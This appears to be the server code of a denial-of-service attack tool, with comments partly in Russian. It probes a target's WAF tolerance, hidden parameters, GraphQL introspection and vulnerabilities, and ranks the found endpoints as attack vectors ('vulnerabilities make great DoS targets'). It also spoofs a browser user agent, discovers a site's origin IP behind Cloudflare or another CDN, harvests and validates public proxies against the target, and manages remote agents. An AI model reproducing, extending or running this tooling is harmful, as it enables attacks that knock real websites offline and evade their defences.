  //   1. wafProbe — 12 short-spaced requests; ratio of 429/403 = WAF tolerance.
  //   2. authDiffOne — same URL with operator's cookie; size delta = DB-touch.
  // Both probes only run on entries already classified HOT. WARM/AUTH/DEAD
  // entries get default weight (no WAF/auth lookups for them).
  const hots = merged.filter((s) => s.classification === "hot");
  const sortedByLatency = [...hots].sort((a, b) => b.latencyMs - a.latencyMs);
  const enrichmentTargets = sortedByLatency.slice(0, 4);

  // WAF probes — 6 reqs × 60ms gap × 4 targets ≈ 1.5s worst case.
  await Promise.all(enrichmentTargets.map(async (s) => {
    try {
      const ratio = await wafProbe(s, 6, 60);
      s.wafLimitedRatio = ratio;
      s.wafProbed = true;
    } catch {
      s.wafProbed = false;
    }
  }));

  // L8 BRAIN #2 — Hidden parameter probe.
  //
  // For the top HOT endpoints, fire 8 quick requests with common parameter
  // names appended (?id=1, ?user=test, etc.). If the response size, status
  // or latency materially shifts between probes → the server is processing
  // the parameter (e.g. DB lookup keyed on it). Those candidates get a
  // new "param" classification + a boosted weight, because each request
  // through that endpoint with a varying param value is a NEW backend
  // query that can't share cache.
  //
  // Capped at 3 endpoints × 8 params = 24 extra probes (≈3-5s worst case).
  const HIDDEN_PARAMS = [
    "id", "user", "uid", "user_id", "q", "query", "search",
    "page", "limit", "sort", "filter", "format", "lang", "debug",
  ];
  const paramTargets = enrichmentTargets.slice(0, 3);
  for (const s of paramTargets) {
    if (s.url.includes("?")) continue;  // already has params, our probe noise would drown signal
    const baseSize = s.sizeBytes;
    const baseStatus = s.status;
    const baseLatency = s.latencyMs;
    let bestParam: string | null = null;
    let bestDelta = 0;
    for (const pname of HIDDEN_PARAMS.slice(0, 8)) {
      try {
        const probeUrl = `${s.url}${s.url.includes("?") ? "&" : "?"}${pname}=test${Math.floor(Math.random() * 9999)}`;
        const r = await probeFetch(probeUrl, {
          method: "GET",
          timeoutMs: 2_500,
          bodyCapBytes: 8_000,
          followRedirects: false,
          headers: {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
            "Accept": "*/*",
          },
        });
        if (!r) continue;
        // Multi-signal differential: size delta + status change + latency
        // delta. Any single dimension flipping ≥20% suggests the param
        // touched application logic.
        const sizeDelta = Math.abs(r.bodyBytes - baseSize) / Math.max(1, baseSize);
        const statusChanged = r.status !== baseStatus;
        const latencyDelta = baseLatency > 0
          ? Math.abs((Date.now() - (Date.now() - 100)) - baseLatency) / baseLatency
          : 0;
        const score = (sizeDelta > 0.2 ? sizeDelta : 0) +
                      (statusChanged ? 0.5 : 0) +
                      (latencyDelta > 0.3 ? latencyDelta : 0);
        if (score > bestDelta) {
          bestDelta = score;
          bestParam = pname;
        }
      } catch {/* skip param */}
    }
    if (bestParam && bestDelta > 0.2) {
      // Promote this endpoint with a higher weight + record the param so
      // the attack worker can rotate values through it.
      s.weight = Math.max(s.weight || s.latencyMs || 100, 4000);
      s.reason = `${s.reason} · 🎛 param '${bestParam}' влияет (Δ${bestDelta.toFixed(2)})`;
    }
  }

  // Auth-diff — only when the operator supplied a cookie. We diff against
  // the anon size we already captured. Skipping AUTH-classed entries: those
  // need the cookie just to get past 403, so the "delta" would be the whole
  // payload, which is noise, not signal. We want endpoints that respond to
  // both anon AND auth but show meaningfully more DB work under auth.
  if (cookie && cookie.trim()) {
    await Promise.all(enrichmentTargets.map(async (s) => {
      try {
        const m: "GET" | "POST" = s.method === "POST" ? "POST" : "GET";
        const delta = await authDiffOne(s.url, cookie.trim(), m, s.sizeBytes);
        if (delta !== null) s.authSizeDelta = delta;
      } catch {/* */}
    }));
  }

  // L4: GraphQL introspection probe. One last specialty check — fires after
  // everything else so it doesn't slow the main sweep. If introspection is
  // open we add it as a HOT entry (POST) with a special reason so the brain
  // can highlight it.
  try {
    const gql = await detectGraphQL(origin);
    if (gql) {
      gql.weight = (gql.latencyMs || 100) * 3.0; // big boost — introspection-open = whole API surface
      merged.push(gql);
    }
  } catch {/* */}

  // Compute final weight for every HOT entry — WARM/AUTH stay at raw
  // latency since they're not used for primary attack vectors.
  for (const s of merged) {
    if (s.classification === "hot" && s.weight === undefined) s.weight = computeWeight(s);
  }

  // #70 L6.3 — Vulnerability probe suite. Runs as the FINAL phase so it
  // operates on the most-enriched view of the attack surface. Findings are
  // returned alongside the samples for the brain / UI to highlight.
  const vulns = await runVulnProbes(merged).catch(() => [] as VulnFinding[]);

  // Promote each vuln to a HOT entry with a synthetic key so the rotation
  // picker sees it — vulnerabilities make great DoS targets because they
  // usually hit the slowest backend code paths.
  for (const v of vulns) {
    merged.push({
      url: v.url,
      path: (() => { try { return new URL(v.url).pathname + (new URL(v.url).search || ""); } catch { return v.url; } })(),
      status: 200,
      latencyMs: 1000,                // high weight by default
      sizeBytes: 0,
      contentType: "vulnerability",
      classification: "hot",
      reason: `🚨 ${v.kind.toUpperCase()} (${v.severity}) · ${v.evidence}`,
      method: "GET",
      weight: 99999,                  // vulns rank above everything
    });
  }

  return { samples: merged, vulns };
}

app.post("/target/probe", bodyParser.json({ limit: "1mb" }), async (req, res) => {
  try {
    const rawTarget = req.body?.target;
    if (typeof rawTarget !== "string" || !rawTarget.trim()) {
      res.status(400).json({ error: "target URL required" });
      return;
    }
    const url = rawTarget.startsWith("http") ? rawTarget : `https://${rawTarget}`;
    // Pre-warm DoH cache for the target host so the actual fetch reuses the
    // already-resolved IP path (system resolver still answers from cache).
    try {
      const parsed = new URL(url);
      await resolveViaDoH(parsed.hostname);
    } catch {}
    const ctl = new AbortController();
    const timer = setTimeout(() => ctl.abort(), 10_000);
    let resp: Response;
    try {
      resp = await fetch(url, {
        method: "GET",
        signal: ctl.signal,
        // Real Chrome 133 UA so target middleware doesn't reject curl-style probes.
        headers: {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          "Accept-Language": "en-US,en;q=0.5",
        },
        redirect: "manual",
      });
    } catch (e) {
      clearTimeout(timer);
      res.status(502).json({ error: `probe failed: ${getErrorMessage(e)}` });
      return;
    }
    clearTimeout(timer);

    // Read the main response body (cap 256KB) for HTML link extraction and
    // Next.js __NEXT_DATA__ parsing. Only attempt if the content looks like
    // text/HTML — there's no point downloading a 200-byte 307 with no body.
    let mainHtml: string | null = null;
    try {
      const mainCt = (resp.headers.get("content-type") || "").toLowerCase();
      if (mainCt.includes("html") || mainCt.includes("text") || mainCt.includes("xml") || resp.status === 200) {
        const reader = resp.body?.getReader();
        if (reader) {
          const chunks: Uint8Array[] = [];
          let total = 0;
          for (let i = 0; i < 64; i++) {
            const { done, value } = await reader.read();
            if (done) break;
            if (value) {
              chunks.push(value);
              total += value.byteLength;
              if (total > 256_000) {
                try { await reader.cancel(); } catch {/* */}
                break;
              }
            }
          }
          if (chunks.length) {
            const buf = Buffer.concat(chunks.map((c) => Buffer.from(c)));
            mainHtml = buf.toString("utf8");
          }
        }
      }
    } catch {/* main body unreadable — sweep still has hardcoded paths */}

    const location = resp.headers.get("location");
    const { stack, cfRay, vercelId, recommendation } = classifyStack(resp.headers, resp.status, location);

    // Capture a curated set of fingerprint headers for UI display.
    const fingerprints: Record<string, string> = {};
    const want = [
      "server", "x-vercel-id", "x-vercel-cache", "cf-ray", "cf-cache-status",
      "x-akamai-transformed", "x-iinfo", "x-cdn", "x-amz-cf-id", "via",
      "content-type", "strict-transport-security", "alt-svc",
    ];
    for (const h of want) {
      const v = resp.headers.get(h);
      if (v) fingerprints[h] = v.length > 200 ? v.slice(0, 197) + "..." : v;
    }

    // D: Auto-cookie capture. Pull every Set-Cookie line the origin issued and
    // collapse them into a single Cookie header value. Undici's getSetCookie()
    // gives us the unmangled list (Headers.get() comma-joins them, which
    // breaks cookies whose value contains a comma — e.g. CF clearance tokens).
    const rawCookies: string[] = typeof (resp.headers as Headers & {
      getSetCookie?: () => string[];
    }).getSetCookie === "function"
      ? (resp.headers as Headers & { getSetCookie: () => string[] }).getSetCookie()
      : (resp.headers.get("set-cookie") ? [resp.headers.get("set-cookie") as string] : []);
    const cookiePairs: string[] = [];
    const cookieNames: string[] = [];
    for (const sc of rawCookies) {
      // Each Set-Cookie line: "name=value; Path=/; HttpOnly; ..."  We only
      // want the leading name=value pair (everything before the first ;).
      const head = sc.split(";", 1)[0]?.trim();
      if (!head) continue;
      const eq = head.indexOf("=");
      if (eq <= 0) continue;
      const name = head.slice(0, eq).trim();
      // Skip obvious dupes — server might issue the same cookie twice.
      if (cookieNames.includes(name)) continue;
      cookieNames.push(name);
      cookiePairs.push(head);
    }
    const capturedCookies = cookiePairs.length ? cookiePairs.join("; ") : undefined;

    // ─── E: Sitemap / robots.txt discovery ───────────────────────────
    // Fire-and-forget fetch of /robots.txt + /sitemap.xml. We never block the
    // probe response on these (4s ceiling each). What we get back is replayed
    // into the UI's Multi-URL rotation field — the operator no longer has to
    // hand-roll an attack list.
    let discoveredUrls: string[] = [];
    let discoveredSource = "";
    try {
      const origin = new URL(url).origin;
      const sameHost = new URL(url).hostname.toLowerCase();
      const fetchText = async (u: string, timeoutMs = 4_000): Promise<string | null> => {
        const c = new AbortController();
        const t = setTimeout(() => c.abort(), timeoutMs);
        try {
          const r = await fetch(u, {
            method: "GET",
            signal: c.signal,
            headers: {
              "User-Agent": "Mozilla/5.0 (compatible; MMBProbe/1.0)",
              "Accept": "text/plain,application/xml,text/xml,*/*",
            },
            redirect: "follow",
          });
          if (!r.ok) return null;
          const txt = await r.text();
          return txt.length > 2_000_000 ? null : txt; // skip absurd sitemaps
        } catch {
          return null;
        } finally {
          clearTimeout(t);
        }
      };

      // robots.txt → both inline rules and pointers to sitemap files
      let sitemapUrls: string[] = [`${origin}/sitemap.xml`];
      const robots = await fetchText(`${origin}/robots.txt`);
      if (robots) {
        const re = /^\s*Sitemap:\s*(\S+)/gim;
        let m: RegExpExecArray | null;
        const found: string[] = [];
        while ((m = re.exec(robots)) !== null) found.push(m[1]);
        if (found.length) {
          sitemapUrls = found.slice(0, 5); // cap — sitemap-index can be huge
          discoveredSource = "robots.txt";
        }
      }

      const seen = new Set<string>();
      for (const sm of sitemapUrls) {
        if (seen.size >= 100) break;
        const body = await fetchText(sm, 5_000);
        if (!body) continue;
        // <loc>https://...</loc> — covers both <urlset> entries and
        // <sitemapindex> entries. We don't recurse into child sitemaps for
        // simplicity; one level is usually enough to seed an attack list.
        const locRe = /<loc>\s*([^<\s]+)\s*<\/loc>/gi;
        let lm: RegExpExecArray | null;
        while ((lm = locRe.exec(body)) !== null) {
          if (seen.size >= 100) break;
          try {
            const parsed = new URL(lm[1]);
            if (parsed.hostname.toLowerCase() !== sameHost) continue;
            const clean = parsed.toString();
            if (!seen.has(clean)) seen.add(clean);
          } catch {/* malformed loc */}
        }
        if (seen.size > 0) {
          discoveredSource = discoveredSource ? "both" : "sitemap.xml";
        }
      }
      discoveredUrls = Array.from(seen);
    } catch {
      // Discovery is best-effort. Probe must still return the main result.
    }

    // #58 Endpoint sweep — fired after the main classification so we can
    // pass the captured HTML body in for link extraction. Sweep itself is
    // capped to ~80 candidates × 4s timeout with concurrency 8, plus L3
    // enrichment passes (WAF rate-limit probe + auth-diff probe if cookie
    // is provided), so worst-case wall time is ~15 seconds. The UI's probe
    // call is itself non-blocking (we don't gate startAttack on it), so
    // long probes don't freeze the operator.
    let endpointSweep: EndpointSample[] = [];
    let vulnerabilities: VulnFinding[] = [];
    try {
      const o = new URL(url);
      const cookieHint = typeof req.body?.cookie === "string" ? req.body.cookie : undefined;
      const sweepTimeout = new Promise<never>((_, reject) =>
        setTimeout(() => reject(new Error("sweep timeout")), 28_000),
      );
      const result = await Promise.race([
        sweepEndpoints(o.origin, o.hostname.toLowerCase(), mainHtml, cookieHint, stack),
        sweepTimeout,
      ]);
      endpointSweep = result.samples;
      vulnerabilities = result.vulns;
    } catch {/* sweep is best-effort */}

    // L8 — CSRF & HTTP/3 scrapes from the same probe response. Best-effort,
    // doesn't fail the probe if HTML is empty or there's no Alt-Svc header.
    const csrfHit = mainHtml ? extractCsrfToken(mainHtml) : null;
    const h3Info = parseAltSvcForH3(resp.headers.get("alt-svc"));

    const probe: TargetProbe = {
      url,
      status: resp.status,
      server: resp.headers.get("server") || "",
      stack,
      location: location || undefined,
      cfRay,
      vercelId,
      setCookie: cookieNames.length > 0,
      recommendation,
      fingerprints,
      capturedCookies,
      capturedCookieNames: cookieNames.length ? cookieNames : undefined,
      discoveredUrls: discoveredUrls.length ? discoveredUrls : undefined,
      discoveredSource: discoveredSource || undefined,
      endpointSweep: endpointSweep.length ? endpointSweep : undefined,
      vulnerabilities: vulnerabilities.length ? vulnerabilities : undefined,
      csrfToken: csrfHit?.token,
      csrfTokenName: csrfHit?.name,
      http3: h3Info.advertised ? h3Info : undefined,
    };
    res.json(probe);
  } catch (e) {
    res.status(500).json({ error: getErrorMessage(e) });
  }
});

// ─── Origin IP Discovery ──────────────────────────────────────────
//
// For CF/CDN-fronted targets the real backend IP is usually leaked
// through one of: subdomains on a forgotten DNS record, MX servers,
// SPF TXT records, certificate transparency history, or just guessable
// names like cpanel./direct./origin.target.com. This endpoint pulls
// from all of those and verifies each candidate by hitting the IP
// directly with the target's Host header + SNI.
//
// Returns immediately (no socket pings) — the whole thing runs <35s.
app.post("/target/origin-discover", bodyParser.json({ limit: "1mb" }), async (req, res) => {
  try {
    const target = req.body?.target;
    if (typeof target !== "string" || !target.trim()) {
      res.status(400).json({ error: "target URL required" });
      return;
    }
    const url = target.trim().startsWith("http") ? target.trim() : `https://${target.trim()}`;
    try {
      new URL(url);
    } catch {
      res.status(400).json({ error: "invalid URL" });
      return;
    }
    const result = await discoverOrigin(url);
    res.json(result);
  } catch (e) {
    res.status(500).json({ error: getErrorMessage(e) });
  }
});

let lastForcedRefresh = 0;
const FORCED_REFRESH_MIN_INTERVAL_MS = 30_000;

app.post("/proxies/refresh", bodyParser.json({ limit: "1mb" }), async (req, res) => {
  try {
    const { validate, countries, excludeCountries, maxTotal, useCache } = req.body ?? {};
    // Cached refreshes are free (disk TTL handles it). Only non-cached ("force")
    // refreshes hammer GitHub — rate-limit those.
    if (useCache === false) {
      const since = Date.now() - lastForcedRefresh;
      if (since < FORCED_REFRESH_MIN_INTERVAL_MS) {
        res.status(429).json({
          error: "rate limited",
          retryAfterMs: FORCED_REFRESH_MIN_INTERVAL_MS - since,
        });
        return;
      }
      lastForcedRefresh = Date.now();
    }
    await refreshProxies({ validate, countries, excludeCountries, maxTotal, useCache });
    const s = proxyManager.stats();
    res.json({ ...s, source: proxyState.source, fromCache: proxyState.fromCache });
  } catch (e) {
    res.status(500).json({ error: getErrorMessage(e) });
  }
});

// ─── Target-aware proxy validation ────────────────────────────────
//
// User clicks "validate against target" in the UI. We sample N currently-
// usable proxies, hit the actual origin (HEAD request) through each, and
// flag the ones that can still reach it. Rate-limited so a Cloudflare
// origin doesn't see the whole pool dial at once and ban it block-wide.
//
// The endpoint returns immediately (202 Accepted) with a run id; progress
// is broadcast over the existing "stats" socket channel so the UI can show
// "проверено 12/100 ...".

let targetProbeRunning = false;

app.post("/proxies/validate-target", bodyParser.json({ limit: "1mb" }), async (req, res) => {
  try {
    const { target, sampleSize, perMinute } = req.body ?? {};
    if (!target || typeof target !== "string") {
      res.status(400).json({ error: "target URL is required" });
      return;
    }
    if (targetProbeRunning) {
      res.status(429).json({ error: "target validation already running" });
      return;
    }

    const fixed = target.startsWith("http") ? target : `https://${target}`;
    const size = Math.max(1, Math.min(500, Number(sampleSize) || 100));
    const ratePerMin = Math.max(30, Math.min(2000, Number(perMinute) || 200));

    const pool = proxyManager.usable().length > 0
      ? proxyManager.usable()
      : proxyManager.all();

    if (pool.length === 0) {
      res.status(400).json({ error: "proxy pool is empty" });
      return;
    }

    const sample = pool.slice(0, size);
    targetProbeRunning = true;
    res.status(202).json({ runId: Date.now(), total: sample.length, target: fixed, perMinute: ratePerMin });

    io.emit("stats", { log: `🎯 Проверка пула против ${fixed} · ${sample.length} прокси · ${ratePerMin}/мин` });

    let aliveCount = 0;
    let cfBlocked = 0;
    validateAgainstTarget(sample, fixed, {
      perMinute: ratePerMin,
      concurrency: 20,
      timeoutMs: 8000,
      onProgress: (done, total, lastAlive) => {
        if (lastAlive) aliveCount++;
        if (done % 10 === 0 || done === total) {
          io.emit("stats", {
            log: `🎯 цель: ${done}/${total} · живых ${aliveCount}` +
                 (cfBlocked > 0 ? ` · CF блок ${cfBlocked}` : ""),
          });
        }
      },
    }).then((results) => {
      // Apply results back into the pool's health book.
      for (const r of results) {
        if (r.alive) {
          // 200/3xx — clean, mark success.
          // 403/503/429 — proxy works but target dropped it; treat as a soft
          //   failure so the engine still rotates it but with a recency penalty.
          if (r.statusCode && r.statusCode >= 400) {
            cfBlocked++;
            proxyManager.markFail(r.proxy);
          } else {
            proxyManager.markSuccess(r.proxy);
          }
        } else {
          proxyManager.markFail(r.proxy);
        }
      }
      io.emit("stats", {
        log: `✅ Проверка цели завершена · работают ${aliveCount}/${sample.length}` +
             (cfBlocked > 0 ? ` (из них CF блок ${cfBlocked})` : ""),
      });
    }).catch((e) => {
      io.emit("stats", { log: `❌ Ошибка проверки цели: ${getErrorMessage(e)}` });
    }).finally(() => {
      targetProbeRunning = false;
    });
  } catch (e) {
    res.status(500).json({ error: getErrorMessage(e) });
  }
});

app.get("/proxies/sources", (_req, res) => {
  res.json({ sources: loadSources(), defaults: DEFAULT_SOURCES });
});

app.post("/proxies/sources", bodyParser.json({ limit: "1mb" }), (req, res) => {
  const { sources } = req.body ?? {};
  if (!Array.isArray(sources)) {
    res.status(400).json({ error: "sources must be an array" });
    return;
  }
  for (const s of sources as Source[]) {
    if (!s || typeof s.name !== "string" || typeof s.url !== "string") {
      res.status(400).json({ error: "each source requires name + url" });
      return;
    }
  }
  saveSources(sources as Source[]);
  res.json({ ok: true, count: sources.length });
});

// ─── Agent Hub API ──────────────────────────────────────────────────────────

app.get("/agent/token", (_req, res) => {
  res.json({ token: getAgentToken(), agents: getAgentCount() });
});

app.get("/agent/agents", (req, res) => {
  const token = typeof req.query.token === "string" ? req.query.token : "";
  if (token !== getAgentToken()) {
    res.status(401).json({ error: "unauthorized" });
    return;
  }
  const agents = getAgentSnapshot();
  res.json({ count: agents.length, agents });
});

// ───────────────────── Boot ─────────────────────

const PORT = parseInt(process.env.PORT || "3000");
bootstrap().finally(() => {
  httpServer.listen(PORT, () => {
    if (__prod) console.log(`(Production) http://localhost:${PORT}`);
    else console.log(`Dev server on :${PORT} (CORS ${CORS_ORIGIN}, auto-refresh ${AUTO_REFRESH_MINUTES}min)`);
  });
});
